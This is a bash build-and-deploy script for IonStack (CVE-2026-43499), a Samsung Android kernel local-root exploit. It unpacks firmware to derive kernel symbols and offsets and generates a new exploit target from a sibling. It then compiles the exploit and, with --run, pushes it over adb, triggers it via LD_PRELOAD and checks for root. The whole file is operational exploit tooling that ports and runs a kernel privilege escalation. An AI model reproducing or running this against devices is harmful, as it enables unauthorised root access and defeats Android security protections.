#!/usr/bin/env bash
# make-target.sh — build an IonStack (CVE-2026-43499) target for a Samsung
# firmware that has no pre-configured profile, without hand-editing offsets.
#
# The script drives the repository's own target_generator pipeline:
#
#   firmware zip / boot.img / kernel Image
#        -> boot.img.lz4 -> boot.img -> magiskboot unpack -> kernel Image
#        -> kallsyms.txt + config.txt
#        -> generate_target.py (kallsyms + ikconfig + capstone)
#        -> src/targets/<BUILD>/  ->  make PROJECT=<BUILD>
#
# The only decision that cannot be derived from the firmware is which sibling
# target to inherit the source overrides from.  It is resolved automatically by
# scoring every existing target on kernel version, device series and SoC
# family; --sibling overrides the choice.
#
# Usage:
#   ./target_generator/make-target.sh SM-S908U1 S908U1UEU8GYJ1 --fw firmware.zip
#   ./target_generator/make-target.sh SM-S908U1 S908U1UEU8GYJ1 --fw boot.img
#   ./target_generator/make-target.sh SM-S908U1 S908U1UEU8GYJ1 --download
#   ./target_generator/make-target.sh --list-siblings SM-S908U1
#
# Options:
#   --fw <path>         firmware source: .zip, .img, .img.lz4 or raw kernel Image
#   --download          try to fetch the "fac" firmware from SamFW
#   --sibling <TARGET>  inherit source overrides from this target
#   --exp32|--exp64     force the embedded exploit stage (default: inherit)
#   --magiskboot <path> use this magiskboot binary
#   --out <dir>         work directory (default: fw_extract/<BUILD>)
#   --no-install        generate only, do not touch src/targets/
#   --no-build          install the target, do not compile
#   --push              push the built binaries to the connected device
#   --run               push and run the exploit on the connected device
#   --force             overwrite an existing target directory
#   --dry-run           print the plan and the sibling ranking, change nothing
#   -h, --help          this help
#
# Env overrides:
#   ANDROID_NDK_HOME    NDK root (the Makefile also probes the usual paths)
#   MAGISKBOOT          path to a magiskboot binary
#   MAGISK_CACHE        cache dir for the auto-downloaded magiskboot (default ~/.cache/ionstack)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
TARGETS_DIR="$REPO_ROOT/src/targets"
GEN_DIR="$SCRIPT_DIR"
REMOTE_DIR=/data/local/tmp

MODEL=""
BUILD=""
FW=""
OUTDIR=""
SIBLING=""
EXP_STAGE=""
MAGISKBOOT="${MAGISKBOOT:-}"
MAGISK_CACHE="${MAGISK_CACHE:-$HOME/.cache/ionstack}"
DO_INSTALL=1
DO_BUILD=1
DO_PUSH=0
DO_RUN=0
FORCE=0
DRY_RUN=0

WORK=""
CLEANUP_WORK=0

if [ -t 1 ]; then
  C_B=$'\033[1m'; C_C=$'\033[36m'; C_G=$'\033[32m'; C_Y=$'\033[33m'; C_R=$'\033[31m'; C_0=$'\033[0m'
else
  C_B=""; C_C=""; C_G=""; C_Y=""; C_R=""; C_0=""
fi

step() { printf '\n%s==> %s%s\n' "$C_C" "$*" "$C_0" >&2; }
info() { printf '    %s\n' "$*" >&2; }
ok()   { printf '    %s[+]%s %s\n' "$C_G" "$C_0" "$*" >&2; }
warn() { printf '    %s[!]%s %s\n' "$C_Y" "$C_0" "$*" >&2; }
die()  { printf '\n%s[ERROR]%s %s\n' "$C_R" "$C_0" "$*" >&2; exit 1; }

usage() { sed -n '2,42p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; }

cleanup() {
  [ "$CLEANUP_WORK" = "1" ] && [ -n "$WORK" ] && rm -rf "$WORK"
  return 0
}
trap cleanup EXIT

need() {
  command -v "$1" >/dev/null 2>&1 || die "missing required tool: $1${2:+ ($2)}"
}

# ---------------------------------------------------------------- arguments --

while [ $# -gt 0 ]; do
  case "$1" in
    --fw)          FW="${2:?--fw needs a path}"; shift 2 ;;
    --download)    FW="__download__"; shift ;;
    --sibling)     SIBLING="${2:?--sibling needs a target name}"; shift 2 ;;
    --exp32)       EXP_STAGE="exp32"; shift ;;
    --exp64)       EXP_STAGE="exp64"; shift ;;
    --magiskboot)  MAGISKBOOT="${2:?--magiskboot needs a path}"; shift 2 ;;
    --out)         OUTDIR="${2:?--out needs a directory}"; shift 2 ;;
    --no-install)  DO_INSTALL=0; shift ;;
    --no-build)    DO_BUILD=0; shift ;;
    --push)        DO_PUSH=1; shift ;;
    --run)         DO_RUN=1; DO_PUSH=1; shift ;;
    --force)       FORCE=1; shift ;;
    --dry-run)     DRY_RUN=1; shift ;;
    -h|--help)     usage; exit 0 ;;
    -*)            die "unknown option: $1 (try --help)" ;;
    *)             if [ -z "$MODEL" ]; then MODEL="$1"; elif [ -z "$BUILD" ]; then BUILD="$1";
                   else die "unexpected argument: $1"; fi; shift ;;
  esac
done

if [ -z "$MODEL" ] || [ -z "$BUILD" ]; then
  usage
  exit 2
fi

if [ "$FW" = "__download__" ]; then
  need curl
  FW_URL="https://samfw.com/firmware/$MODEL/$BUILD/"
  die "automatic download needs the exact SamFW package name.\n    Open: $FW_URL\n    then re-run with --fw <downloaded.zip>"
fi

if [ -n "$FW" ]; then
  [ -e "$FW" ] || die "firmware source not found: $FW"
  FW="$(cd "$(dirname "$FW")" && pwd)/$(basename "$FW")"
fi

# --------------------------------------------------------------- magiskboot --

resolve_magiskboot() {
  if [ -n "$MAGISKBOOT" ]; then
    [ -x "$MAGISKBOOT" ] || die "magiskboot is not executable: $MAGISKBOOT"
    return
  fi
  if command -v magiskboot >/dev/null 2>&1; then
    MAGISKBOOT="$(command -v magiskboot)"
    return
  fi
  local c
  for c in "$REPO_ROOT/tools/magiskboot" "$HOME/.local/bin/magiskboot" "/tmp/opencode/magiskboot"; do
    if [ -x "$c" ]; then MAGISKBOOT="$c"; return; fi
  done
  if [ -x "$MAGISK_CACHE/magiskboot" ]; then MAGISKBOOT="$MAGISK_CACHE/magiskboot"; return; fi

  step "Fetching magiskboot"
  need curl
  need unzip
  mkdir -p "$MAGISK_CACHE"
  local apk="$MAGISK_CACHE/Magisk.apk"
  curl -fsSL -o "$apk" "https://github.com/topjohnwu/Magisk/releases/latest/download/Magisk.apk" \
    || die "could not download Magisk.apk"
  local lib
  case "$(uname -m)" in
    x86_64)  lib="lib/x86_64/libmagiskboot.so" ;;
    aarch64|arm64) lib="lib/arm64-v8a/libmagiskboot.so" ;;
    i386|i686) lib="lib/x86/libmagiskboot.so" ;;
    *) die "unsupported host arch for the magiskboot auto-download: $(uname -m)" ;;
  esac
  unzip -p "$apk" "$lib" > "$MAGISK_CACHE/magiskboot" || die "magiskboot not found in Magisk.apk"
  chmod +x "$MAGISK_CACHE/magiskboot"
  MAGISKBOOT="$MAGISK_CACHE/magiskboot"
  ok "magiskboot -> $MAGISKBOOT"
}

# ------------------------------------------------------------- metadata ------

series_of() {
  # SM-S908U1 -> S908 ; X900XXU9DYE5 -> X900 ; M556BXXU4AYB4 -> M556
  local m="${1#SM-}"
  printf '%s' "$m" | grep -oE '^[A-Z][0-9]{3}' || true
}

kernel_version_of_target() {
  # kernel version of an existing target, from target_meta.json or target.h
  local dir="$1" v=""
  if [ -f "$dir/target_meta.json" ]; then
    v="$(sed -nE 's/.*"kernel_version"[[:space:]]*:[[:space:]]*"([^"]*)".*/\1/p' "$dir/target_meta.json" || true)"
  fi
  if [ -z "$v" ]; then
    v="$(grep -m1 'define BUILD_VARIANT_LABEL' "$dir/target.h" 2>/dev/null \
         | sed -nE 's/.*_v([0-9]+\.[0-9]+\.[0-9]+).*/\1/p' || true)"
  fi
  if [ -z "$v" ]; then
    v="$(grep -m1 -iE 'kernel.*v[0-9]+\.[0-9]+\.[0-9]+' "$dir/target.h" 2>/dev/null \
         | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1 | tr -d 'v' || true)"
  fi
  printf '%s' "$v"
}

family_of_target() {
  local dir="$1"
  [ -f "$dir/target_meta.json" ] || return 0
  sed -nE 's/.*"soc_family"[[:space:]]*:[[:space:]]*"([^"]*)".*/\1/p' "$dir/target_meta.json" || true
}

# ------------------------------------------------------------- sibling pick --

pick_sibling() {
  local want_series="$1" want_ver="$2" want_family="$3"
  local d name ver fam series score best="" best_score=-1
  local -a rows=()

  for d in "$TARGETS_DIR"/*/; do
    name="$(basename "$d")"
    [ "$name" = "$BUILD" ] && continue
    [ -f "$d/target.h" ] || continue

    ver="$(kernel_version_of_target "$d")"
    fam="$(family_of_target "$d")"
    series="$(series_of "$name")"

    score=0
    if [ -n "$want_ver" ] && [ -n "$ver" ]; then
      [ "$ver" = "$want_ver" ] && score=$((score + 1000))
      [ "${ver%.*}" = "${want_ver%.*}" ] && score=$((score + 400))
    fi
    if [ -n "$want_series" ] && [ -n "$series" ]; then
      [ "$series" = "$want_series" ] && score=$((score + 300))
    fi
    if [ -n "$want_family" ] && [ -n "$fam" ]; then
      [ "$fam" = "$want_family" ] && score=$((score + 200))
    fi
    # prefer the more specific sibling (more override files)
    local n
    n="$(find "$d" -maxdepth 1 -type f ! -name target.h | wc -l)"
    score=$((score + n))

    rows+=("$(printf '%6d  %-22s ver=%-10s series=%-6s family=%-8s overrides=%d' \
            "$score" "$name" "${ver:-?}" "${series:-?}" "${fam:-?}" "$n")")
    if [ "$score" -gt "$best_score" ]; then best_score=$score; best="$name"; fi
  done

  step "Sibling ranking"
  if [ ${#rows[@]} -gt 0 ]; then
    printf '%s\n' "${rows[@]}" | sort -rn
  else
    info "(no candidate targets)"
  fi

  [ -n "$best" ] || die "no sibling target found under $TARGETS_DIR"
  SIBLING_PICK="$best"
}

# ---------------------------------------------------------------- firmware ---

extract_boot_from_zip() {
  # $1 zip, $2 out dir -> prints the path of boot.img
  local fw="$1" out="$2"
  need unzip; need tar; need lz4
  local ap lz4f
  ap="$(unzip -Z1 "$fw" | grep -E '(^|/)AP_[^/]*\.tar(\.md5)?$' | head -1)"
  [ -n "$ap" ] || die "no AP_*.tar member found in $fw"
  info "AP member: $ap"
  # tar stops reading after the first match (--occurrence=1), so unzip dies
  # with SIGPIPE: judge the extraction by tar's status, not the pipeline's.
  local tar_rc=0
  set +e
  unzip -p "$fw" "$ap" | tar xf - -C "$out" --wildcards --occurrence=1 '*boot.img.lz4'
  tar_rc=${PIPESTATUS[1]}
  set -e
  [ "$tar_rc" -eq 0 ] || die "could not extract boot.img.lz4 from $ap (tar rc=$tar_rc)"
  lz4f="$(find "$out" -name 'boot.img.lz4' | head -1)"
  [ -n "$lz4f" ] || die "boot.img.lz4 not found in $ap"
  lz4 -d -f "$lz4f" "$out/boot.img"
  printf '%s' "$out/boot.img"
}

extract_fingerprint_from_zip() {
  # best effort: ro.build.fingerprint from the CSC tar
  local fw="$1" out="$2" csc prop
  csc="$(unzip -Z1 "$fw" | grep -E '(^|/)CSC_[^/]*\.tar(\.md5)?$' | head -1)"
  [ -n "$csc" ] || return 0
  prop="$(unzip -p "$fw" "$csc" | tar xOf - --wildcards '*build.prop' 2>/dev/null \
          | grep -m1 '^ro.build.fingerprint=' || true)"
  [ -n "$prop" ] || return 0
  printf '%s' "${prop#ro.build.fingerprint=}"
}

device_props() {
  # fingerprint / codename / running kernel from the connected device
  command -v adb >/dev/null 2>&1 || return 0
  adb get-state >/dev/null 2>&1 || return 0
  adb shell 'getprop ro.build.fingerprint; getprop ro.product.device; getprop ro.build.version.incremental; uname -r' 2>/dev/null || true
}

# ------------------------------------------------------------------- main ----

step "Target: $MODEL / $BUILD"
[ -n "$SIBLING" ] && info "forced sibling: $SIBLING"

OUTDIR="${OUTDIR:-$REPO_ROOT/fw_extract/$BUILD}"
if [ "$DRY_RUN" = "1" ]; then
  DRY_WORK="$(mktemp -d)"
  WORK="$DRY_WORK"
else
  mkdir -p "$OUTDIR"
  WORK="$OUTDIR"
fi

need python3
need strings

# -- 1. kernel Image ---------------------------------------------------------

KERNEL=""
if [ -n "$FW" ]; then
  step "Preparing the kernel Image"
  resolve_magiskboot
  case "$FW" in
    *.zip)
      BOOT_IMG="$(extract_boot_from_zip "$FW" "$WORK")"
      info "boot.img -> $BOOT_IMG"
      ( cd "$WORK" && "$MAGISKBOOT" unpack "$BOOT_IMG" )
      ;;
    *.lz4)
      need lz4
      lz4 -d -f "$FW" "$WORK/boot.img"
      ( cd "$WORK" && "$MAGISKBOOT" unpack "$WORK/boot.img" )
      ;;
    *.img)
      ( cd "$WORK" && "$MAGISKBOOT" unpack "$FW" )
      ;;
    *)
      KERNEL="$(cd "$(dirname "$FW")" && pwd)/$(basename "$FW")"
      info "using the supplied kernel Image directly"
      ;;
  esac

  if [ -z "$KERNEL" ]; then
    # magiskboot v31 writes the components into the current directory; older
    # builds used an unpacked/ subdirectory.
    local_cand=""
    for base in "$WORK" "$WORK/unpacked"; do
      for c in kernel Image kernel.gz kernel.zst kernel.lz4 kernel.xz Image.gz Image.zst; do
        if [ -f "$base/$c" ]; then local_cand="$base/$c"; break; fi
      done
      [ -n "$local_cand" ] && break
    done
    [ -n "$local_cand" ] || die "magiskboot unpack produced no kernel file"
    case "$local_cand" in
      *.gz)  gzip -d -f "$local_cand" ;;
      *.zst) zstd -d -f "$local_cand" ;;
      *.lz4) lz4 -d -f "$local_cand" ;;
      *.xz)  xz -d -f "$local_cand" ;;
    esac
    KERNEL="${local_cand%.*}"
    [ -f "$KERNEL" ] || KERNEL="$local_cand"
    info "kernel Image -> $KERNEL"
  fi
else
  die "no firmware source: pass --fw <zip|img|lz4|Image> (SamFW blocks scripted downloads)"
fi

[ -f "$KERNEL" ] || die "kernel Image not found: $KERNEL"

# -- 2. symbols and config ---------------------------------------------------

step "Extracting symbols and kernel config"
KALLSYMS="$WORK/kallsyms.txt"
CONFIG="$WORK/config.txt"
if [ ! -s "$KALLSYMS" ] || [ ! -s "$CONFIG" ]; then
  need gcc
  [ -x "$GEN_DIR/kallsyms" ] || gcc -O2 -o "$GEN_DIR/kallsyms" "$GEN_DIR/kallsyms.c"
  # kallsyms writes "kallsyms.txt" into the current directory
  ( cd "$WORK" && "$GEN_DIR/kallsyms" "$KERNEL" )
  "$GEN_DIR/extract-ikconfig" "$KERNEL" > "$CONFIG"
fi
ok "kallsyms: $(wc -l < "$KALLSYMS") symbols"
ok "config:   $(wc -l < "$CONFIG") lines"

# -- 3. metadata -------------------------------------------------------------

step "Reading the kernel identity"
BANNER="$(strings -a "$KERNEL" | grep -m1 -E '^Linux version [0-9]' || true)"
[ -n "$BANNER" ] || die "could not find the kernel banner in the Image"
KVER_FULL="$(printf '%s' "$BANNER" | sed -E 's/^Linux version ([^ ]+).*/\1/')"
KVER="$(printf '%s' "$KVER_FULL" | cut -d- -f1)"
KBUILD_ID="$(printf '%s' "$BANNER" | grep -oE 'ab[A-Z0-9]+' | head -1 || true)"
info "version: $KVER   ($KBUILD_ID)"

if grep -q '^CONFIG_ARCH_QCOM=y' "$CONFIG"; then
  FAMILY="qcom"
elif grep -q '^CONFIG_ARCH_EXYNOS=y' "$CONFIG"; then
  FAMILY="exynos"
else
  FAMILY="unknown"
  warn "SoC family not recognised from the kernel config"
fi
info "SoC family: $FAMILY"

DEVICE_PROPS="$(device_props || true)"
FP=""; CODENAME=""; DEVICE_BUILD=""; DEVICE_KVER=""
if [ -n "$DEVICE_PROPS" ]; then
  {
    read -r FP || true
    read -r CODENAME || true
    read -r DEVICE_BUILD || true
    read -r DEVICE_KVER || true
  } <<< "$DEVICE_PROPS"
fi
if [ -z "$FP" ] && [ -n "$FW" ] && [ "${FW##*.}" = "zip" ]; then
  FP="$(extract_fingerprint_from_zip "$FW" "$WORK" || true)"
fi
[ -n "$FP" ] && info "fingerprint: $FP"
if [ -n "$DEVICE_KVER" ] && [ -n "$KVER" ]; then
  if [ "${DEVICE_KVER%%-*}" = "$KVER" ]; then
    ok "the connected device is running this exact kernel ($DEVICE_KVER)"
  else
    warn "the connected device runs $DEVICE_KVER, the firmware kernel is $KVER"
  fi
fi
if [ -n "$DEVICE_BUILD" ] && [ "$DEVICE_BUILD" != "$BUILD" ]; then
  warn "the connected device runs build $DEVICE_BUILD, not $BUILD"
fi
[ -n "$CODENAME" ] || CODENAME="$(series_of "$MODEL")"

# -- 4. sibling --------------------------------------------------------------

step "Selecting the sibling target"
if [ -n "$SIBLING" ]; then
  [ -f "$TARGETS_DIR/$SIBLING/target.h" ] || die "unknown sibling target: $SIBLING"
else
  pick_sibling "$(series_of "$MODEL")" "$KVER" "$FAMILY"
  SIBLING="$SIBLING_PICK"
fi
ok "sibling: $SIBLING"
SIB_VER="$(kernel_version_of_target "$TARGETS_DIR/$SIBLING")"
if [ -n "$SIB_VER" ] && [ "$SIB_VER" != "$KVER" ]; then
  warn "sibling $SIBLING targets kernel $SIB_VER, this firmware is $KVER."
  warn "Struct layouts are shared per GKI generation — verify the offsets below."
fi

# -- 5. generate target.h ----------------------------------------------------

step "Generating target.h"
TEMPLATE="$WORK/target_template.h"
GENERATED="$WORK/target.h"
cp "$TARGETS_DIR/$SIBLING/target.h" "$TEMPLATE"
python3 "$GEN_DIR/generate_target.py" "$KALLSYMS" "$CONFIG" "$KERNEL" \
        --template "$TEMPLATE" -o "$GENERATED" \
  || die "generate_target.py failed"

VARIANT_LABEL="${CODENAME}_${BUILD}_v${KVER}"
sed -i "s|^#define BUILD_VARIANT_LABEL .*|#define BUILD_VARIANT_LABEL \"${VARIANT_LABEL}\"|" "$GENERATED"
if [ -n "$FP" ]; then
  sed -i "s|^#define BUILD_FINGERPRINT .*|#define BUILD_FINGERPRINT \"${FP}\"|" "$GENERATED"
  ok "BUILD_FINGERPRINT updated"
else
  warn "could not determine the build fingerprint; the sibling's value was kept"
  warn "fix BUILD_FINGERPRINT in the generated target.h before shipping it"
fi
ok "BUILD_VARIANT_LABEL = $VARIANT_LABEL"

# The header comment is inherited from the sibling and describes the wrong
# device — rewrite it so the provenance matches this target.
rewrite_header() {
  python3 - "$GENERATED" "$MODEL" "$CODENAME" "$KVER" "$KVER_FULL" "$BUILD" \
            "$SIBLING" "$SIB_VER" "$SRC_DESC" <<'PY'
import re, sys
path, model, codename, kver, kver_full, build, sibling, sib_ver, src_desc = sys.argv[1:10]
text = open(path, encoding="utf-8", errors="replace").read()
m = re.search(r"/\*.*?\*/", text, re.S)
if not m:
    sys.exit(0)
header = f"""/*
 * Real-device target — {model} (codename {codename})
 * v{kver} kernel (Android GKI), build {build}.
 *
 * Offsets extracted directly from the boot.img kernel Image
 * (target_generator: kallsyms + ikconfig + capstone disassembly).
 * Kernel version string: {kver_full}.
 *
 * Firmware provenance: {src_desc}
 *
 * Source overrides inherited from the sibling target {sibling}
 * (same {sib_ver or 'v5.10'} GKI generation).
 *
 * Generated by target_generator/make-target.sh — do not edit the offsets by
 * hand; regenerate the target instead.
 */"""
open(path, "w", encoding="utf-8").write(text[:m.start()] + header + text[m.end():])
PY
}
SRC_DESC="boot.img supplied by the user"
if [ -n "$FW" ]; then
  case "$FW" in
    *.zip)
      ZIP_MD5="$(md5sum "$FW" | cut -d' ' -f1)"
      CSC_ID="$(unzip -Z1 "$FW" | grep -oE 'CSC_[A-Z0-9]+' | head -1 | cut -d_ -f2 || true)"
      SRC_DESC="firmware package $(basename "$FW") (md5 $ZIP_MD5)"
      [ -n "$CSC_ID" ] && SRC_DESC="$SRC_DESC / CSC $CSC_ID"
      ;;
    *) SRC_DESC="kernel Image $(basename "$FW")" ;;
  esac
fi
rewrite_header
ok "header provenance rewritten"

# -- 6. install --------------------------------------------------------------

if [ "$DO_INSTALL" = "1" ]; then
  step "Installing src/targets/$BUILD"
  TGT="$TARGETS_DIR/$BUILD"
  if [ -e "$TGT" ] && [ "$FORCE" = "0" ]; then
    die "$TGT already exists (use --force to overwrite)"
  fi
  mkdir -p "$TGT"
  for f in "$TARGETS_DIR/$SIBLING"/*; do
    base="$(basename "$f")"
    [ "$base" = "target.h" ] && continue
    if [ "$base" = "exp64" ] && [ "$EXP_STAGE" != "exp64" ]; then
      info "skipping exp64/ (use --exp64 to inherit the 64-bit stage)"
      continue
    fi
    cp -r "$f" "$TGT/"
  done
  cp "$GENERATED" "$TGT/target.h"
  cat > "$TGT/target_meta.json" <<EOF
{
  "model": "$MODEL",
  "build": "$BUILD",
  "codename": "$CODENAME",
  "kernel_version": "$KVER",
  "soc_family": "$FAMILY",
  "fingerprint": "$FP",
  "sibling": "$SIBLING",
  "generated_by": "target_generator/make-target.sh"
}
EOF
  ok "installed $TGT"
  info "overrides inherited from $SIBLING"
else
  step "Skipping the installation (--no-install)"
  info "generated header: $GENERATED"
fi

# -- 7. build ----------------------------------------------------------------

if [ "$DO_BUILD" = "1" ] && [ "$DO_INSTALL" = "1" ]; then
  step "Building"
  MAKE_ARGS=(PROJECT="$BUILD")
  NDK="${ANDROID_NDK_HOME:-${ANDROID_NDK_ROOT:-$HOME/android-ndk-cache/android-ndk-r29}}"
  if [ -d "$NDK" ]; then
    # a glibc arm-linux-gnueabi-gcc cannot produce a static Android binary:
    # force the NDK branch of the Makefile.
    MAKE_ARGS+=(HOST_CC32=ndk-only)
    info "toolchain: NDK $NDK"
  else
    info "toolchain: Makefile defaults (set ANDROID_NDK_HOME for the NDK)"
  fi
  make -C "$REPO_ROOT" "${MAKE_ARGS[@]}" clean preload root-helper
  ok "binaries in $REPO_ROOT/build/$BUILD/bin"
fi

# -- 8. push / run -----------------------------------------------------------

if [ "$DO_PUSH" = "1" ] && [ "$DO_BUILD" = "1" ]; then
  step "Pushing to the device"
  need adb
  OUT="$REPO_ROOT/build/$BUILD/bin"
  adb push "$OUT/cve-2026-43499"      "$REMOTE_DIR/cve-2026-43499"
  adb push "$OUT/cve-2026-43499-root" "$REMOTE_DIR/cve-2026-43499-root"
  adb shell chmod 755 "$REMOTE_DIR/cve-2026-43499" "$REMOTE_DIR/cve-2026-43499-root"
  ok "pushed"
fi

if [ "$DO_RUN" = "1" ] && [ "$DO_BUILD" = "1" ]; then
  step "Running the exploit"
  warn "the race stage can panic the kernel — reboot first for a clean slab state"
  adb shell "cd $REMOTE_DIR && LD_PRELOAD=$REMOTE_DIR/cve-2026-43499 sh -c ':'" </dev/null
  step "Root check"
  adb shell "$REMOTE_DIR/cve-2026-43499-root -c 'id; getenforce'" </dev/null
fi

step "Done"
info "target: $BUILD   sibling: $SIBLING   kernel: $KVER ($FAMILY)"
[ "$DO_BUILD" = "1" ] && info "build: make PROJECT=$BUILD clean preload root-helper"
exit 0
